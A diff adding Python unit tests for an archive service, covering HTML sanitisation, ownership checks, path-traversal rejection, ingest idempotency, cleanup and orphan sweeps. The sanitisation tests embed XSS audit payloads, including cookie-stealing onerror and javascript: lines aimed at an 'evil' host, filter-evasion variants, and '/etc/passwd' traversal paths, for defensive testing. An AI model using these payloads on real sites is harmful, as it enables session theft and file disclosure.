@@ -15,8 +15,28 @@ sys.modules["boto3"] = MagicMock()
 sys.modules["botocore"] = MagicMock()
 sys.modules["botocore.config"] = MagicMock()
 
+# ---------------------------------------------------------------------------
+# Shared per-service module names: models/servicer/quota/page_processor exist
+# in every service. Import this suite's copies ONCE and register them under a
+# unique alias; tests/conftest.py re-points the shared sys.modules names per
+# test so combined multi-suite pytest runs never use another service's code.
+# ---------------------------------------------------------------------------
+_PP_ALIAS = "_ppsvc_archive-service_"
+if _PP_ALIAS + "models" not in sys.modules:
+    for _name in ("models", "servicer", "quota", "page_processor"):
+        sys.modules.pop(_name, None)
+
 import archive_pb2
+import grpc
+import models  # noqa: F401  -- register ORM tables on Base.metadata before create_all
+import page_processor  # noqa: F401
+import quota as _quota_mod  # noqa: F401  -- alias: local `quota` vars shadow the name
+import servicer  # noqa: F401
+from db import Base, db_session
 from page_processor import sanitise_and_rewrite
+
+for _name in ("models", "page_processor", "quota", "servicer"):
+    sys.modules[_PP_ALIAS + _name] = sys.modules[_name]
 
 # ---------------------------------------------------------------------------
 # Page processor tests
@@ -515,7 +535,7 @@ class TestGetArchiveFile(unittest.TestCase):
         svc = ArchiveServicer()
         ctx = _FakeContext()
         req = archive_pb2.GetArchiveFileRequest(
-            page_id="p1", user_id="", file_path="index.html",
+            page_id="p1", user_id="u1", file_path="index.html",
         )
         resp = svc.GetArchiveFile(req, ctx)
 
@@ -535,10 +555,15 @@ class TestGetArchiveFile(unittest.TestCase):
         mock_r2_cls.return_value = MagicMock()
         svc = ArchiveServicer()
 
+        mock_session = MagicMock()
+        mock_session.execute.return_value.scalar_one_or_none.return_value = None
+        mock_db_session.return_value.__enter__ = lambda s: mock_session
+        mock_db_session.return_value.__exit__ = lambda s, *a: None
+
         # Reject paths with /.. traversal
         ctx = _FakeContext()
         req = archive_pb2.GetArchiveFileRequest(
-            page_id="p1", user_id="", file_path="foo/../../../etc/passwd",
+            page_id="p1", user_id="u1", file_path="foo/../../../etc/passwd",
         )
         svc.GetArchiveFile(req, ctx)
         self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
@@ -546,7 +571,7 @@ class TestGetArchiveFile(unittest.TestCase):
         # Reject absolute paths
         ctx2 = _FakeContext()
         req2 = archive_pb2.GetArchiveFileRequest(
-            page_id="p1", user_id="", file_path="/etc/passwd",
+            page_id="p1", user_id="u1", file_path="/etc/passwd",
         )
         svc.GetArchiveFile(req2, ctx2)
         self.assertEqual(ctx2._code, grpc.StatusCode.INVALID_ARGUMENT)
@@ -554,13 +579,10 @@ class TestGetArchiveFile(unittest.TestCase):
         # Allow filenames containing ".." without a slash (edge case)
         ctx3 = _FakeContext()
         req3 = archive_pb2.GetArchiveFileRequest(
-            page_id="p1", user_id="", file_path="assets/image..thumb.jpg",
+            page_id="p1", user_id="u1", file_path="assets/image..thumb.jpg",
         )
-        mock_session = MagicMock()
         page = _make_page(page_id="p1", user_id="u1")
         mock_session.execute.return_value.scalar_one_or_none.return_value = page
-        mock_db_session.return_value.__enter__ = lambda s: mock_session
-        mock_db_session.return_value.__exit__ = lambda s, *a: None
         mock_r2 = MagicMock()
         mock_r2.bucket = "test-bucket"
         body = MagicMock()
@@ -592,12 +614,675 @@ class TestGetArchiveFile(unittest.TestCase):
         svc = ArchiveServicer()
         ctx = _FakeContext()
         req = archive_pb2.GetArchiveFileRequest(
-            page_id="p1", user_id="", file_path="assets/missing.jpg",
+            page_id="p1", user_id="u1", file_path="assets/missing.jpg",
         )
         resp = svc.GetArchiveFile(req, ctx)
 
         self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)
         self.assertEqual(resp.data, b"")
+
+
+# ---------------------------------------------------------------------------
+# Sanitisation tests (2.7) — XSS payloads from the audit
+# ---------------------------------------------------------------------------
+
+class TestSanitisation(unittest.TestCase):
+    def _sanitize(self, html: bytes, asset_map=None):
+        return sanitise_and_rewrite(html, asset_map or {})[0]
+
+    def test_inline_event_handler_removed(self):
+        """Audit payload: onerror must be stripped, src preserved."""
+        html = b'<html><img src="a.png" onerror="fetch(\'//evil?t=\'+document.cookie)"></html>'
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"onerror", rewritten)
+        self.assertIn(b'src="a.png"', rewritten)
+
+    def test_onclick_and_mixed_case_handlers_removed(self):
+        html = b'<html><body><div onclick="evil()" ONMOUSEOVER="evil()">x</div></body></html>'
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"onclick", rewritten)
+        self.assertNotIn(b"ONMOUSEOVER", rewritten)
+        self.assertNotIn(b"evil()", rewritten)
+
+    def test_javascript_uri_neutralized_anchor_text_kept(self):
+        """Audit payload: javascript: href neutralized, anchor text preserved."""
+        html = (
+            b"<html><a href=\"javascript:document.location='//evil/'+document.cookie\">x</a></html>"
+        )
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"javascript:", rewritten)
+        self.assertNotIn(b"//evil/", rewritten)
+        self.assertIn(b">x</a>", rewritten)
+
+    def test_javascript_uri_evasions_caught(self):
+        for payload in (
+            b'JaVaScRiPt:alert(1)',
+            b'java\tscript:alert(1)',
+            b'java\nscript:alert(1)',
+            b'  javascript:alert(1)',
+            b'jav\x01ascript:alert(1)',
+        ):
+            html = b'<html><a href="' + payload + b'">x</a></html>'
+            rewritten = self._sanitize(html)
+            self.assertNotIn(b"alert(1)", rewritten, payload)
+
+    def test_data_text_html_blocked(self):
+        html = (
+            b'<html><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'
+            b'<a href="data:text/html,<script>alert(1)</script>">y</a></html>'
+        )
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"data:text/html", rewritten)
+        self.assertNotIn(b"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg", rewritten)
+
+    def test_data_image_uris_allowed(self):
+        """Archived pages legitimately use inline data: images — preserved."""
+        uri = b"data:image/png;base64,iVBORw0KGgo="
+        html = b'<html><img src="' + uri + b'"></html>'
+        rewritten = self._sanitize(html)
+        self.assertIn(uri, rewritten)
+
+    def test_svg_onload_removed(self):
+        html = b'<html><svg onload="alert(1)"><circle r="1"/></svg></html>'
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"onload", rewritten)
+        self.assertNotIn(b"alert(1)", rewritten)
+        self.assertIn(b"<svg", rewritten)  # element itself survives
+
+    def test_srcdoc_embed_removed(self):
+        html = (
+            b'<html><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></html>'
+        )
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"srcdoc", rewritten)
+        self.assertNotIn(b"alert(1)", rewritten)
+
+    def test_form_action_neutralized(self):
+        html = b'<html><form action="javascript:fetch(\'//evil\')"><input type="submit"></form></html>'
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"javascript:", rewritten)
+        self.assertIn(b"<form", rewritten)
+
+    def test_xlink_href_neutralized(self):
+        html = b'<html><svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg></html>'
+        rewritten = self._sanitize(html)
+        self.assertNotIn(b"javascript:", rewritten)
+
+    def test_legitimate_content_survives(self):
+        """Spec: nothing removed except scripts, handlers, dangerous URIs."""
+        html = (
+            b'<html><head><style>body{color:red}</style></head><body>'
+            b'<p class="x">Hello</p><img src="photo.jpg" alt="pic">'
+            b'<a href="https://example.com">link</a><form action="/go"></form>'
+            b"</body></html>"
+        )
+        rewritten, _preview, body = sanitise_and_rewrite(
+            html, {"photo.jpg": "assets/photo.jpg"}
+        )
+        self.assertIn(b"Hello", rewritten)
+        self.assertIn(b'alt="pic"', rewritten)
+        self.assertIn(b"https://example.com", rewritten)
+        self.assertIn(b'action="/go"', rewritten)
+        self.assertIn(b"assets/photo.jpg", rewritten)
+        self.assertIn(b"Hello", body.encode() if isinstance(body, str) else body)
+
+
+# ---------------------------------------------------------------------------
+# Mandatory ownership (2.3): empty user_id is never a wildcard
+# ---------------------------------------------------------------------------
+
+class TestEmptyUserIdRejected(unittest.TestCase):
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_get_page_content_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2):
+        import grpc
+        from servicer import ArchiveServicer
+
+        page = _make_page(page_id="p1", user_id="owner-u1")
+        mock_session = MagicMock()
+        mock_session.execute.return_value.scalar_one_or_none.return_value = page
+        mock_db_session.return_value.__enter__ = lambda s: mock_session
+        mock_db_session.return_value.__exit__ = lambda s, *a: None
+
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        svc.GetPageContent(
+            archive_pb2.GetPageContentRequest(page_id="p1", user_id=""), ctx
+        )
+        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
+        mock_r2.return_value.presign.assert_not_called()
+
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_get_archive_file_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2_cls):
+        import grpc
+        from servicer import ArchiveServicer
+
+        mock_r2_cls.return_value = MagicMock()
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        svc.GetArchiveFile(
+            archive_pb2.GetArchiveFileRequest(
+                page_id="p1", user_id="", file_path="index.html",
+            ),
+            ctx,
+        )
+        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
+        mock_r2_cls.return_value.client.get_object.assert_not_called()
+
+
+# ---------------------------------------------------------------------------
+# Path traversal hardening (2.8)
+# ---------------------------------------------------------------------------
+
+class TestPathTraversalHardening(unittest.TestCase):
+    def _svc_with_owner_page(self, mock_db_session):
+        page = _make_page(page_id="p1", user_id="u1")
+        mock_session = MagicMock()
+        mock_session.execute.return_value.scalar_one_or_none.return_value = page
+        mock_db_session.return_value.__enter__ = lambda s: mock_session
+        mock_db_session.return_value.__exit__ = lambda s, *a: None
+        return page
+
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_leading_traversal_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
+        import grpc
+        from servicer import ArchiveServicer
+
+        self._svc_with_owner_page(mock_db_session)
+        mock_r2_cls.return_value = MagicMock()
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        svc.GetArchiveFile(
+            archive_pb2.GetArchiveFileRequest(
+                page_id="p1", user_id="u1", file_path="../other-page/index.html",
+            ),
+            ctx,
+        )
+        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
+        mock_r2_cls.return_value.client.get_object.assert_not_called()
+
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_embedded_traversal_normalizing_to_dotdot_rejected(
+        self, mock_engine, mock_db_session, mock_r2_cls
+    ):
+        import grpc
+        from servicer import ArchiveServicer
+
+        self._svc_with_owner_page(mock_db_session)
+        mock_r2_cls.return_value = MagicMock()
+        svc = ArchiveServicer()
+
+        for path in ("a/../../x", "assets/../../secret", "..", "a/../.."):
+            ctx = _FakeContext()
+            svc.GetArchiveFile(
+                archive_pb2.GetArchiveFileRequest(
+                    page_id="p1", user_id="u1", file_path=path,
+                ),
+                ctx,
+            )
+            self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT, path)
+            mock_r2_cls.return_value.client.get_object.assert_not_called()
+
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_absolute_path_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
+        import grpc
+        from servicer import ArchiveServicer
+
+        self._svc_with_owner_page(mock_db_session)
+        mock_r2_cls.return_value = MagicMock()
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        svc.GetArchiveFile(
+            archive_pb2.GetArchiveFileRequest(
+                page_id="p1", user_id="u1", file_path="/abs",
+            ),
+            ctx,
+        )
+        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)
+        mock_r2_cls.return_value.client.get_object.assert_not_called()
+
+    @patch("servicer.R2Client")
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_benign_inner_dotdot_path_resolves_within_root(
+        self, mock_engine, mock_db_session, mock_r2_cls
+    ):
+        """a/../b normalizes to b — inside the root, so allowed."""
+        from servicer import ArchiveServicer
+
+        self._svc_with_owner_page(mock_db_session)
+        mock_r2 = MagicMock()
+        mock_r2.bucket = "b"
+        mock_r2.client.get_object.return_value = {
+            "Body": MagicMock(**{"read.return_value": b"x"}),
+            "ContentType": "text/plain",
+        }
+        mock_r2_cls.return_value = mock_r2
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        svc.GetArchiveFile(
+            archive_pb2.GetArchiveFileRequest(
+                page_id="p1", user_id="u1", file_path="assets/../index.html",
+            ),
+            ctx,
+        )
+        self.assertIsNone(ctx._code)
+        mock_r2.client.get_object.assert_called_once_with(
+            Bucket="b", Key="u1/p1/index.html",
+        )
+
+
+# ---------------------------------------------------------------------------
+# Per-user ingest idempotency (2.6) — real SQLite DB
+# ---------------------------------------------------------------------------
+
+class TestPerUserIdempotency(unittest.TestCase):
+    def setUp(self):
+        from sqlalchemy import create_engine as ce
+        self.engine = ce("sqlite://")
+        Base.metadata.create_all(self.engine)
+        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
+        self.engine_patcher.start()
+        self.r2_patcher = patch("servicer.R2Client")
+        self.mock_r2_cls = self.r2_patcher.start()
+        self.mock_r2_cls.return_value = MagicMock()
+        self.search_patcher = patch("servicer._get_search_stub", return_value=None)
+        self.search_patcher.start()
+
+    def tearDown(self):
+        self.search_patcher.stop()
+        self.r2_patcher.stop()
+        self.engine_patcher.stop()
+
+    def _ingest(self, user_id, job_id):
+        from servicer import ArchiveServicer
+        svc = ArchiveServicer()
+        return svc.IngestPage(
+            _build_ingest_request(user_id=user_id, extension_job_id=job_id),
+            _FakeContext(),
+        )
+
+    def test_same_user_replay_returns_existing_page(self):
+        r1 = self._ingest("uA", "job-1")
+        r2 = self._ingest("uA", "job-1")
+        self.assertEqual(r1.page_id, r2.page_id)
+        # Only one set of uploads (1 asset + html + meta happens once;
+        # here assets are empty so 2 uploads for the first ingest, 0 for replay)
+        self.assertEqual(self.mock_r2_cls.return_value.upload.call_count, 2)
+
+    def test_same_job_id_across_users_creates_distinct_pages(self):
+        r_a = self._ingest("uA", "job-shared")
+        r_b = self._ingest("uB", "job-shared")
+        self.assertNotEqual(r_a.page_id, r_b.page_id)
+        self.assertTrue(r_b.success)
+
+        from models import Page
+        from sqlalchemy import select
+
+        with db_session(self.engine) as session:
+            rows = session.execute(
+                select(Page).where(Page.extension_job_id == "job-shared")
+            ).scalars().all()
+            self.assertEqual(len(rows), 2)
+            self.assertEqual({r.user_id for r in rows}, {"uA", "uB"})
+            page_a = session.execute(
+                select(Page).where(Page.id == r_a.page_id)
+            ).scalar_one()
+            self.assertEqual(page_a.user_id, "uA")
+
+    def test_composite_unique_enforced_in_schema(self):
+        """The (user_id, extension_job_id) pair is unique, not the job id alone."""
+        from models import Page
+        from sqlalchemy import create_engine as ce
+        from sqlalchemy.exc import IntegrityError
+
+        eng = ce("sqlite://")
+        Base.metadata.create_all(eng)
+        with db_session(eng) as session:
+            session.add(Page(id="x1", user_id="uA", url="http://a", title="t",
+                             r2_key="k", extension_job_id="j"))
+        with db_session(eng) as session:
+            # Same job id, different user → allowed
+            session.add(Page(id="x2", user_id="uB", url="http://b", title="t",
+                             r2_key="k", extension_job_id="j"))
+        with self.assertRaises(IntegrityError), db_session(eng) as session:
+            session.add(Page(id="x3", user_id="uA", url="http://c", title="t",
+                             r2_key="k", extension_job_id="j"))
+
+
+# ---------------------------------------------------------------------------
+# Failed-ingest R2 cleanup + quota rollback (2.9)
+# ---------------------------------------------------------------------------
+
+class TestFailedIngestCleanup(unittest.TestCase):
+    @patch("servicer._get_search_stub", return_value=None)
+    @patch("servicer.R2Client")
+    @patch("servicer.check_and_reserve", return_value=None)
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_upload_failure_cleans_prefix_and_rolls_back(
+        self, mock_engine, mock_db_session, mock_quota, mock_r2_cls, mock_search
+    ):
+        from servicer import ArchiveServicer
+
+        mock_session = MagicMock()
+        mock_session.execute.return_value.scalar_one_or_none.return_value = None
+        mock_db_session.return_value.__enter__ = lambda s: mock_session
+        mock_db_session.return_value.__exit__ = lambda s, *a: None
+
+        r2 = MagicMock()
+        # First asset upload succeeds, second fails
+        r2.upload.side_effect = [None, RuntimeError("R2 exploded")]
+        mock_r2_cls.return_value = r2
+
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+        req = _build_ingest_request(assets=[
+            archive_pb2.Asset(filename="a.jpg", content_type="image/jpeg", data=b"1"),
+            archive_pb2.Asset(filename="b.jpg", content_type="image/jpeg", data=b"2"),
+        ])
+
+        with self.assertRaises(RuntimeError):
+            svc.IngestPage(req, ctx)
+
+        # The attempt's prefix was cleaned up best-effort
+        prefix = r2.upload.call_args_list[0].args[0].rsplit("/assets/", 1)[0]
+        r2.delete_prefix.assert_called_once_with(prefix)
+
+        # Quota increments were rolled back with the session
+        mock_session.rollback.assert_called()
+
+    @patch("servicer._get_search_stub", return_value=None)
+    @patch("servicer.R2Client")
+    @patch("servicer.check_and_reserve", return_value=None)
+    @patch("servicer.db_session")
+    @patch("servicer.get_engine", return_value=MagicMock())
+    def test_cleanup_failure_logged_not_fatal(
+        self, mock_engine, mock_db_session, mock_quota, mock_r2_cls, mock_search
+    ):
+        """Spec: cleanup failure is logged, not fatal — original error still raised."""
+        from servicer import ArchiveServicer
+
+        mock_session = MagicMock()
+        mock_session.execute.return_value.scalar_one_or_none.return_value = None
+        mock_db_session.return_value.__enter__ = lambda s: mock_session
+        mock_db_session.return_value.__exit__ = lambda s, *a: None
+
+        r2 = MagicMock()
+        r2.upload.side_effect = RuntimeError("R2 down")
+        r2.delete_prefix.side_effect = Exception("cleanup also failed")
+        mock_r2_cls.return_value = r2
+
+        svc = ArchiveServicer()
+        ctx = _FakeContext()
+
+        with self.assertRaises(RuntimeError):  # original error, not the cleanup error
+            svc.IngestPage(_build_ingest_request(), ctx)
+
+
+# ---------------------------------------------------------------------------
+# Reliable search indexing (3.8) — real SQLite DB
+# ---------------------------------------------------------------------------
+
+class TestReliableSearchIndexing(unittest.TestCase):
+    def setUp(self):
+        from sqlalchemy import create_engine as ce
+        self.engine = ce("sqlite://")
+        Base.metadata.create_all(self.engine)
+        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
+        self.engine_patcher.start()
+        self.r2_patcher = patch("servicer.R2Client")
+        self.r2_patcher.start()
+        self.sleep_patcher = patch("servicer.time.sleep")
+        self.sleep_patcher.start()
+
+    def tearDown(self):
+        self.sleep_patcher.stop()
+        self.r2_patcher.stop()
+        self.engine_patcher.stop()
+
+    def _set_stub(self, stub):
+        p = patch("servicer._get_search_stub", return_value=stub)
+        p.start()
+        self.addCleanup(p.stop)
+
+    def _ingest(self):
+        from servicer import ArchiveServicer
+        return ArchiveServicer().IngestPage(_build_ingest_request(), _FakeContext())
+
+    def _page_row(self, page_id):
+        from models import Page
+        from sqlalchemy import select
+        from sqlalchemy.orm import sessionmaker
+
+        session = sessionmaker(bind=self.engine)()
+        try:
+            # Read before close: db_session's commit would expire instances.
+            return session.execute(
+                select(Page).where(Page.id == page_id)
+            ).scalar_one().search_indexed
+        finally:
+            session.close()
+
+    def test_index_success_marks_page_indexed(self):
+        stub = MagicMock()
+        self._set_stub(stub)
+        resp = self._ingest()
+        self.assertEqual(stub.IndexPage.call_count, 1)
+        self.assertTrue(self._page_row(resp.page_id))
+
+    def test_retry_then_succeed_marks_indexed(self):
+        """IndexPage fails twice, then succeeds → pending flag cleared."""
+        stub = MagicMock()
+        stub.IndexPage.side_effect = [
+            grpc.RpcError("unavailable"),  # attempt 1 (has .code? plain RpcError ok)
+            grpc.RpcError("unavailable"),  # attempt 2
+            None,                          # attempt 3 succeeds
+        ]
+        self._set_stub(stub)
+        resp = self._ingest()
+        self.assertEqual(stub.IndexPage.call_count, 3)
+        self.assertTrue(self._page_row(resp.page_id))
+
+    def test_permanent_failure_leaves_pending_flag(self):
+        """Failures beyond the retry budget stay pending, never swallowed."""
+        stub = MagicMock()
+        stub.IndexPage.side_effect = grpc.RpcError("down")
+        self._set_stub(stub)
+        resp = self._ingest()
+        self.assertEqual(stub.IndexPage.call_count, 3)  # bounded retries
+        self.assertFalse(self._page_row(resp.page_id))
+
+    def test_no_search_service_leaves_pending_flag(self):
+        self._set_stub(None)
+        resp = self._ingest()
+        self.assertFalse(self._page_row(resp.page_id))
+
+    def test_retry_pending_indexing_retries_and_clears(self):
+        """The maintenance RPC retries pending rows and clears them on success."""
+        from servicer import ArchiveServicer
+
+        self._set_stub(None)
+        resp = self._ingest()  # indexed=False (no search service)
+        self._set_stub(MagicMock())  # search service back up
+
+        svc = ArchiveServicer()
+        result = svc.RetryPendingIndexing(
+            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
+        )
+        self.assertEqual(result.retried, 1)
+        self.assertEqual(result.succeeded, 1)
+        self.assertTrue(self._page_row(resp.page_id))
+
+    def test_retry_pending_indexing_counts_failures(self):
+        from servicer import ArchiveServicer
+
+        self._set_stub(None)
+        self._ingest()
+        stub = MagicMock()
+        stub.IndexPage.side_effect = grpc.RpcError("still down")
+        self._set_stub(stub)
+
+        result = ArchiveServicer().RetryPendingIndexing(
+            archive_pb2.RetryPendingIndexingRequest(limit=10), _FakeContext()
+        )
+        self.assertEqual(result.retried, 1)
+        self.assertEqual(result.succeeded, 0)
+
+
+# ---------------------------------------------------------------------------
+# Orphan sweep (5.9) — fake R2 + real SQLite DB
+# ---------------------------------------------------------------------------
+
+class _FakePaginator:
+    def __init__(self, objects):
+        self.objects = objects  # key -> LastModified datetime
+
+    def paginate(self, Bucket=None, Prefix="", Delimiter=None, PaginationConfig=None):
+        if Delimiter == "/":
+            prefixes, contents = set(), []
+            for key, mod in self.objects.items():
+                if not key.startswith(Prefix):
+                    continue
+                rest = key[len(Prefix):]
+                if "/" in rest:
+                    prefixes.add(Prefix + rest.split("/", 1)[0] + "/")
+                else:
+                    contents.append({"Key": key, "LastModified": mod})
+            yield {
+                "CommonPrefixes": [{"Prefix": p} for p in sorted(prefixes)],
+                "Contents": contents,
+            }
+        else:
+            yield {
+                "Contents": [
+                    {"Key": k, "LastModified": self.objects[k]}
+                    for k in sorted(self.objects)
+                    if k.startswith(Prefix)
+                ],
+            }
+
+
+class _FakeR2ForSweep:
+    def __init__(self, objects):
+        self.objects = dict(objects)
+        self.bucket = "test-bucket"
+        self.client = self
+        self.deleted_keys = []
+
+    def get_paginator(self, operation):
+        return _FakePaginator(self.objects)
+
+    def delete_objects(self, Bucket, Delete):
+        for obj in Delete["Objects"]:
+            self.deleted_keys.append(obj["Key"])
+            self.objects.pop(obj["Key"], None)
+
+
+class TestSweepOrphanR2Objects(unittest.TestCase):
+    def setUp(self):
+        from sqlalchemy import create_engine as ce
+        self.engine = ce("sqlite://")
+        Base.metadata.create_all(self.engine)
+        self.engine_patcher = patch("servicer.get_engine", return_value=self.engine)
+        self.engine_patcher.start()
+
+        from datetime import timedelta
+        now = datetime.now(timezone.utc).replace(tzinfo=None)
+        self.old = now - timedelta(days=8)      # older than the 7d grace
+        self.fresh = now - timedelta(hours=1)   # in-flight ingest territory
+
+        # The sweep only considers UUID-shaped page ids (defensive: never
+        # delete objects it cannot map to a page identity).
+        self.live_pid = "11111111-1111-4111-8111-111111111111"
+        self.old_pid = "22222222-2222-4222-8222-222222222222"
+        self.fresh_pid = "33333333-3333-4333-8333-333333333333"
+
+        # u-existing/<live_pid>: row exists → never swept
+        # u-orphan/<old_pid>: no row, old → swept
+        # u-orphan/<fresh_pid>: no row, fresh (in-flight) → left in place
+        self.objects = {
+            f"u-existing/{self.live_pid}/index.html": self.old,
+            f"u-existing/{self.live_pid}/assets/a.png": self.old,
+            f"u-orphan/{self.old_pid}/index.html": self.old,
+            f"u-orphan/{self.old_pid}/assets/a.png": self.old,
+            f"u-orphan/{self.old_pid}/meta.json": self.old,
+            f"u-orphan/{self.fresh_pid}/index.html": self.fresh,
+            f"u-orphan/{self.old_pid}.webp": self.old,
+            "u-notauuid/whatever/index.html": self.old,  # not a page uuid → untouched
+        }
+        self.r2 = _FakeR2ForSweep(self.objects)
+        r2_patcher = patch("servicer.R2Client", return_value=self.r2)
+        r2_patcher.start()
+        self.addCleanup(r2_patcher.stop)
+
+        from models import Page, UserQuota
+        with db_session(self.engine) as session:
+            session.add(Page(id=self.live_pid, user_id="u-existing", url="http://x",
+                             title="t", r2_key=f"u-existing/{self.live_pid}/index.html"))
+            session.add(UserQuota(user_id="u-orphan", pages_this_month=3,
+                                  total_bytes=12345,
+                                  quota_reset_at=now + timedelta(days=20)))
+
+    def tearDown(self):
+        self.engine_patcher.stop()
+
+    def _sweep(self, **kw):
+        from servicer import ArchiveServicer
+        return ArchiveServicer().SweepOrphanR2Objects(
+            archive_pb2.SweepOrphanR2ObjectsRequest(**kw), _FakeContext()
+        )
+
+    def test_orphaned_old_prefix_swept_and_live_left(self):
+        from models import UserQuota
+        from sqlalchemy import select
+
+        resp = self._sweep()  # defaults: 7d grace
+
+        # Deleted: the old orphan prefix (3 objects) + its old thumbnail
+        self.assertEqual(set(self.r2.deleted_keys), {
+            f"u-orphan/{self.old_pid}.webp",
+            f"u-orphan/{self.old_pid}/assets/a.png",
+            f"u-orphan/{self.old_pid}/index.html",
+            f"u-orphan/{self.old_pid}/meta.json",
+        })
+        self.assertEqual(resp.deleted_objects, 4)
+        self.assertEqual(resp.deleted_prefixes, 1)
+        self.assertGreaterEqual(resp.scanned_prefixes, 3)
+
+        # Live page objects untouched
+        self.assertIn(f"u-existing/{self.live_pid}/index.html", self.r2.objects)
+        # Fresh orphan (in-flight ingest) untouched
+        self.assertIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)
+        # Non-uuid folder untouched
+        self.assertIn("u-notauuid/whatever/index.html", self.r2.objects)
+
+        # Quota counters unchanged (quota-neutral)
+        with db_session(self.engine) as session:
+            quota = session.execute(
+                select(UserQuota).where(UserQuota.user_id == "u-orphan")
+            ).scalar_one()
+            self.assertEqual(quota.total_bytes, 12345)
+            self.assertEqual(quota.pages_this_month, 3)
+
+    def test_short_grace_allows_fresh_deletion(self):
+        self._sweep(grace_period_seconds=60)  # 1 minute grace
+        # Fresh object is 1h old > 60s grace → now deletable
+        self.assertNotIn(f"u-orphan/{self.fresh_pid}/index.html", self.r2.objects)
+
+    def test_long_grace_protects_everything(self):
+        resp = self._sweep(grace_period_seconds=365 * 24 * 3600)
+        self.assertEqual(resp.deleted_objects, 0)
+        self.assertEqual(self.r2.deleted_keys, [])
 
 
 if __name__ == "__main__":
